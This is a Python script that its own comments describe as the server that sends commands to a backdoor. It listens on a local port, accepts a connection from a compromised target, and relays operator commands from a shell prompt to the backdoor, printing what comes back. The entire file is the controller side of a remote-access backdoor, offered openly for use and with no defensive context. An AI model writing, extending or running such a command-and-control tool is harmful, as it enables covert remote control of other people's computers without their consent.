#server that sends commands to the backdoor
#run me first
#use ctrl+c on my console to close
import socket
import json
import os
import sys
import subprocess
import threading
import time
from ctypes.wintypes import INT

ip = '127.0.0.1'
port = 4141

server = socket.socket()
server.bind((ip, port))
print('listening For target connection ...')
server.listen(1)
client, client_addr = server.accept()
print(f'[+] {client_addr} connected')

# send commands and receive output in loop
def target_communication():
    while True:
        command = input('* Shell~%s: ' % str(ip))
        is_quitting = command == 'quit'
        command = command.encode()
        client.send(command)
        output = client.recv(1024)
        output = output.decode()
        if is_quitting:
            break
        print(f"output: {output}")
        

target_communication()
